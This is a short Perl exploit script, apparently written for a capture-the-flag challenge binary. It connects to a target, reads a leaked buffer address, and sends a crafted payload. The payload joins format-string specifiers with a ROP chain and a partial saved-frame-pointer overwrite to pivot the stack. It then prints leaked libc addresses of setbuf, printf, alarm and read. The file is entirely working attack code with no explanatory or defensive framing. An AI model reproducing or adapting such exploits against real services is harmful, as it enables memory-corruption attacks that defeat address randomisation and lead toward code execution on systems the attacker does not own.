#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket;

if (@ARGV != 2) {
	use File::Basename;
	my $name = basename($0, "");
	die "Usage: perl $name host port\n";
}

my $sock = new IO::Socket::INET(PeerAddr=>$ARGV[0], PeerPort=>int($ARGV[1]), Proto=>"tcp");
unless ($sock) { die "connection failed: $!\n"; }
binmode($sock);

my $data = <$sock>;
my $nameAddr = 0;
if ($data =~ /0x([0-9a-fA-F]+)/) {
	$nameAddr = hex($1);
} else {
	die "failed to get &Name\n";
}
print $data;

my $pop_rdi_addr = 0x4012f3;
my $printf_addr = 0x401080;

my $payload = "!!!!%6\$s!!!!%7\$s!!!!%8\$s!!!!%9\$s!!!!\n\0";
$payload .= "\0" x (16 - length($payload) % 16);
my $retOffset = $nameAddr + length($payload);

$payload .= pack("Q", $pop_rdi_addr);
$payload .= pack("Q", $nameAddr);
$payload .= pack("Q", $printf_addr);
$payload .= pack("Q", 0);
$payload .= pack("Q", 0x404018);
$payload .= pack("Q", 0x404020);
$payload .= pack("Q", 0x404028);
$payload .= pack("Q", 0x404030);

$payload .= "\0" x (256 - length($payload));
$payload .= pack("S", ($retOffset - 8) & 0xffff); # -8 for "pop rbp" in leave

print $sock $payload;

my $hello = <$sock>;
print $hello;
my $leak_data = <$sock>;
#print $leak_data;
my @leaks = split(/!!!!/, $leak_data);
my @names = ("", "setbuf", "printf", "alarm", "read");

for (my $i = 1; $i < 5; $i++) {
	printf "%s\t0x%x\n", $names[$i], unpack("Q", $leaks[$i] . ("\0" x 8));
}

close($sock);
